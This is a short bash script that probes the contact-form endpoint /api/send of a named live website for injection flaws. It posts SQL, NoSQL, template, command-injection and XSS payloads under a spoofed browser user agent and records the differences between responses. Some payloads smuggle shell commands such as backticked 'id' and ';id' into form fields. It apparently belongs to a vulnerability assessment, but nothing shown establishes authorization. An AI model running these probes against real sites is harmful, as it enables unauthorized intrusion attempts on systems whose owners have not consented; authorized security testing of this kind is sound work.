#!/bin/bash
# Probe /api/send (the only real server-side input) for injection differentials.
cd "$WORK_PATH"
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
O=tool_outputs/send_inj
mkdir -p $O
post(){
  name="$1"; shift
  code=$(curl -s -A "$UA" -o $O/$name.body -D $O/$name.hdr -w "%{http_code} %{size_download} %{time_total}" -X POST "$@" )
  echo "$name -> $code  body_md5=$(md5sum $O/$name.body|cut -c1-8)"
}
B=https://www.infinitycapital.bh/api/send
post base   -H 'Content-Type: application/x-www-form-urlencoded' --data 'fname=Test&lname=User&areacode=%2B973&tel=3600000&cname=vapt&subject=Inquiry&msg=hello&check=1&targets=%5B%5D'
post sqli_fname  --data "fname=Test'&lname=User&areacode=%2B973&tel=3600000&cname=vapt&subject=Inquiry&msg=hello&check=1&targets=%5B%5D"
post sqli_msg   --data 'fname=Test&lname=User&areacode=%2B973&tel=3600000&cname=vapt&subject=Inquiry&msg=hello%27&check=1&targets=%5B%5D'
post ssti_msg   --data 'fname=Test&lname=User&areacode=%2B973&tel=3600000&cname=vapt&subject=Inquiry&msg=%7B%7B7*7%7D%7D&check=1&targets=%5B%5D'
post nosqli     --data 'fname[$ne]=x&lname=User&areacode=%2B973&tel=3600000&cname=vapt&subject=Inquiry&msg=hello&check=1&targets=%5B%5D'
post cmdi_msg   --data 'fname=Test&lname=User&areacode=%2B973&tel=3600000&cname=vapt&subject=Inquiry&msg=hello%60id%60&check=1&targets=%5B%5D'
post cmdi_cname --data 'fname=Test&lname=User&areacode=%2B973&tel=3600000&cname=vapt;id&subject=Inquiry&msg=hello&check=1&targets=%5B%5D'
post xss_msg    --data 'fname=Test&lname=User&areacode=%2B973&tel=3600000&cname=vapt&subject=Inquiry&msg=%3Cscript%3Ealert(1)%3C/script%3E&check=1&targets=%5B%5D'
echo "--- bodies of interest:"
for f in base sqli_fname sqli_msg ssti_msg nosqli cmdi_msg cmdi_cname xss_msg; do
  printf "%-10s " $f; head -c 220 $O/$f.body; echo
done
